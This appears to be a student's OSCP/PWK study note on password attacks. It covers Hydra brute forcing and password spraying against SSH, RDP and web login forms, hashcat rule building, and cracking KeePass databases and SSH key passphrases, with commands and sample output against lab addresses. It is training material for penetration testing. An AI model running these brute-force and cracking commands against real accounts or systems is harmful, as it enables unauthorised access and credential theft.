---
title: "PWK Module 16 - Password Attacks"
created: "2026-04-05"
source: "PEN-200 PWK Course (OffSec 2025)"
type: reference-note
status: active
tags:
  - oscp
  - password-attacks
  - hydra
  - hashcat
  - john-the-ripper
  - cracking
  - pwk
  - reference
  - module-16
---

# Module 16 — Password Attacks

> **OSCP Exam Relevance:** Password attacks come up constantly — brute-forcing services, cracking hashes from `/etc/shadow` or NTLM dumps, unlocking SSH keys, and cracking password managers. Hydra + Hashcat + John is your toolkit. The cracking methodology (extract → format → identify → mutate → attack) applies to every hash you encounter.

**Learning Units Covered:**
- 16.1 Network Service Brute Force (Hydra — SSH, RDP, HTTP)
- 16.2 Password Cracking Fundamentals (hashing, GPU vs CPU)
- 16.3 Wordlist Mutation (hashcat rules)
- 16.4 Cracking Methodology (5-step process)
- 16.5 Password Manager Cracking (KeePass)
- 16.6 SSH Private Key Passphrase Cracking

---

## 16.1 Attacking Network Service Logins (Hydra)

**Hydra** is the go-to tool for brute-forcing network services. It supports SSH, RDP, FTP, HTTP, SMB, and dozens more.

### Prepare rockyou.txt

```bash
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz    # decompress if not already done
ls rockyou.txt                 # confirm ~14 million passwords
```

### SSH Brute Force

```bash
# Single username, rockyou wordlist, custom port
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

# Output:
# [2222][ssh] host: 192.168.50.201   login: george   password: chocolate
```

**Flags:**
- `-l` — single username (lowercase = literal value)
- `-L` — username list file
- `-p` — single password
- `-P` — password list file
- `-s` — custom port

### RDP Password Spray

**Password spraying** = one password, many usernames. Avoids lockout by never hammering a single account.

```bash
# Add target usernames to a list
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

# Spray a single password across all usernames
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

# Output:
# [3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
# [3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
```

> ⚠️ `[ERROR] freerdp: The connection failed to establish` after a hit = credentials are valid but RDP is configured to reject the connection type. Use `xfreerdp` directly to connect.

### HTTP POST Form Brute Force

```bash
# Syntax: hydra -l USER -P WORDLIST HOST http-post-form "PATH:PARAMS:FAIL_STRING"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# ^PASS^ = hydra substitutes each password here
# "Login failed. Invalid" = string in response that indicates failure

# Output:
# [80][http-post-form] host: 192.168.50.201   login: user   password: 121212
```

**How to find the failure string:**
1. Attempt a wrong login in browser
2. Note the error message text (e.g. "Login failed. Invalid username or password")
3. Use that string as the fail indicator in Hydra

> ⚠️ **Noise warning:** Brute force generates many requests — WAFs and fail2ban will block it quickly. Use targeted wordlists and do recon on lockout policy first.

---

## 16.2 Password Cracking Fundamentals

### Hashing vs Encryption

| Concept | Direction | Example |
|---------|-----------|---------|
| **Symmetric encryption** | Encrypt ↔ Decrypt (same key) | AES |
| **Asymmetric encryption** | Public key encrypts, private decrypts | RSA |
| **Hashing** | One-way only — input → fixed output | SHA-256, MD5, bcrypt |

Passwords are stored as hashes. To "crack" = find the input that produces the same hash.

```bash
# Demo: hashing is deterministic but one-way
echo -n "secret" | sha256sum
# 2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b

echo -n "secret1" | sha256sum
# 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
# One char change → completely different hash
```

### GPU vs CPU Cracking Speed

| Algorithm | GPU (RTX 3090) | CPU (i9) | Use GPU when possible |
|-----------|---------------|----------|----------------------|
| MD5 | 68,185 MH/s | 450 MH/s | 150x faster on GPU |
| SHA1 | 21,528 MH/s | 298 MH/s | |
| SHA256 | 9,276 MH/s | 134 MH/s | |

- **Hashcat** = GPU-based (fast) — use on Kali with GPU or cloud instances
- **John the Ripper** = CPU-based — use when GPU unavailable or for John-specific scripts

### Benchmark Your Machine

```bash
hashcat -b
# Shows cracking speed for every algorithm on your hardware
# Use this to estimate if a hash is crackable in time
```

---

## 16.3 Wordlist Mutation (Hashcat Rules)

Real passwords aren't in wordlists. Users mutate base words to meet password policies. Rules simulate this.

### Rule Functions

| Rule | Effect | Example |
|------|--------|---------|
| `c` | Capitalize first letter | `password` → `Password` |
| `$1` | Append "1" | `password` → `password1` |
| `$!` | Append "!" | `password` → `password!` |
| `^A` | Prepend "A" | `password` → `Apassword` |

### Same Line vs Separate Lines

```bash
# demo1.rule (same line = apply ALL rules to EACH password)
$1 c
# password → Password1

# demo2.rule (separate lines = apply EACH rule SEPARATELY = more candidates)
$1
c
# password → password1 AND Password
```

### Building a Rule for a Policy

Policy: "needs 3 numbers, a capital letter, a special character"

```bash
cat demo1.rule
# $1 c $!
# Result: Password1!  Iloveyou1!  Princess1!

cat demo2.rule
# $! $1 c
# Result: Password!1  Iloveyou!1  (order changes output)
```

### Test Rules Without Cracking

```bash
hashcat -r demo.rule --stdout wordlist.txt
# Prints all mutations to stdout — inspect before running a full attack
```

### Pre-Built Rule Files

```bash
ls /usr/share/hashcat/rules/
# best64.rule        — 64 most effective rules (fast, high hit rate)
# rockyou-30000.rule — 30,000 rules from rockyou analysis (comprehensive)
# dive.rule          — very large; use when others fail
# d3ad0ne.rule       — another large comprehensive set
```

---

## 16.4 Cracking Methodology (5 Steps)

```
1. Extract hashes     → dump from /etc/shadow, NTLM, database, file
2. Format hashes      → remove filename prefix (john2hash adds "filename:" prefix)
3. Identify hash type → hash-identifier / hashid / hashcat --help | grep
4. Prepare wordlist   → rockyou + custom words + mutation rules
5. Attack the hash    → hashcat -m MODE hash.txt wordlist.txt -r rules.rule
```

### Identify Hash Type

```bash
# Tool: hash-identifier (interactive)
hash-identifier
# Paste hash → outputs probable algorithm

# Tool: hashid
hashid "4a41e0fdfb57173f8156f58e49628968..."
# Output: SHA-384

# Hashcat mode lookup
hashcat --help | grep -i "md5"
hashcat --help | grep -i "ntlm"
hashcat --help | grep -i "sha-256"
```

**Common hash indicators:**
| Pattern | Algorithm |
|---------|-----------|
| 32 hex chars | MD5 |
| 40 hex chars | SHA1 |
| 64 hex chars | SHA256 |
| `$2y$`, `$2a$`, `$2b$` | bcrypt |
| `$6$` | SHA-512 crypt (Linux /etc/shadow) |
| `$1$` | MD5 crypt |

### Common Hashcat Modes

| Mode | Algorithm | Use Case |
|------|-----------|----------|
| 0 | MD5 | Web app databases |
| 100 | SHA1 | |
| 1000 | NTLM | Windows passwords |
| 1800 | SHA-512 crypt | Linux /etc/shadow |
| 13400 | KeePass | Password manager |
| 22921 | OpenSSH Private Key ($6$) | SSH key passphrase |

---

## 16.5 Cracking a KeePass Database

**KeePass** stores all passwords behind one master password. If you find a `.kdbx` file, cracking the master password unlocks everything.

### Step 1 — Find the Database

```powershell
# On Windows target (PowerShell)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# Found: C:\Users\jason\Documents\Database.kdbx
```

### Step 2 — Extract the Hash

```bash
# Transfer .kdbx to Kali, then:
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
# Database:$keepass$*2*60*0*d74e29a...

# Remove the "Database:" prefix
sed -i 's/Database://' keepass.hash
```

### Step 3 — Identify Hashcat Mode

```bash
hashcat --help | grep -i "keepass"
# 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
```

### Step 4 — Crack

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Result:
# $keepass$*2*60*...:qwertyuiop123!
# Master password: qwertyuiop123!
```

---

## 16.6 Cracking SSH Private Key Passphrases

An SSH private key protected by a passphrase is useless without it. If you find an `id_rsa` file (e.g., via directory traversal), you need to crack the passphrase.

### Step 1 — Extract the Hash

```bash
chmod 600 id_rsa
ssh2john id_rsa > ssh.hash
cat ssh.hash
# id_rsa:$sshng$6$16$7059e78a8d3764...
# The "$6$" = SHA-512

# Remove the filename prefix for hashcat
sed -i 's/id_rsa://' ssh.hash
```

### Step 2 — Identify Mode

```bash
hashcat -h | grep -i "ssh"
# 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Key
```

### Step 3 — Build Custom Wordlist + Rules

If you found a note with the user's password habits/old passwords, use them:

```bash
cat ssh.passwords
# Window
# rickc137
# dave
# superdave
# megadave
# umbrella

# Policy says: 3 numbers + capital + special char
cat ssh.rule
# c $1 $3 $7 $!
# c $1 $3 $7 $@
# c $1 $3 $7 $#
```

### Step 4 — Try Hashcat (may fail on some key types → use John)

```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
# May get: "Token length exception" → switch to John the Ripper
```

### Step 5 — John the Ripper (fallback for SSH)

```bash
# Add rule to John's config
cat ssh.rule
# [List.Rules:sshRules]
# c $1 $3 $7 $!
# c $1 $3 $7 $@
# c $1 $3 $7 $#

sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

# Crack with John
john --wordlist=ssh.passwords --rules=sshRules ssh.hash

# Output:
# Umbrella137!     (id_rsa)
```

### Step 6 — Connect with Cracked Passphrase

```bash
ssh -i id_rsa -p 2222 dave@192.168.50.201
# Enter passphrase: Umbrella137!
# Welcome to Alpine!
```

---

## Quick Reference

```bash
# Hydra — SSH
hydra -l USER -P /usr/share/wordlists/rockyou.txt -s PORT ssh://TARGET_IP

# Hydra — RDP spray
hydra -L users.txt -p "Password123!" rdp://TARGET_IP

# Hydra — HTTP POST
hydra -l USER -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Hashcat — basic crack
hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt

# Hashcat — with rules
hashcat -m MODE hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Hashcat — test rules
hashcat -r rules.rule --stdout wordlist.txt

# John — SSH key
ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt --rules=sshRules ssh.hash

# KeePass
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Identify hash
hash-identifier
hashid "<hash>"
hashcat --help | grep -i "ntlm"
```

---

## Connections

- [[PWK-Module-17-Windows-PrivEsc]] — NTLM hashes dumped from Windows → crack here
- [[PWK-Module-18-Linux-PrivEsc]] — `/etc/shadow` hashes → crack here
- [[PWK-Module-11-Phishing-Basics]] — harvested credentials go here (or reuse directly)
- [[Password-Cracking-Methodology]] — permanent note on the 5-step process
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [Hashcat wiki — rule functions](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — identify mode by example
- [SecLists wordlists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
- [HackTricks - Password Attacks](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)

---

## Practice Labs

| Room / Machine | Platform | What it practices |
|----------------|----------|-------------------|
| [[Password Attacks]] | TryHackMe | CUPP/crunch/cewl wordlist generation, Hydra/Medusa brute-force, hash cracking with hashcat |
| [[Brute]] | TryHackMe | HTTP brute-force and credential stuffing |
| [[Game Zone]] | TryHackMe | sqlmap hash extraction → hashcat cracking (john hash format) |
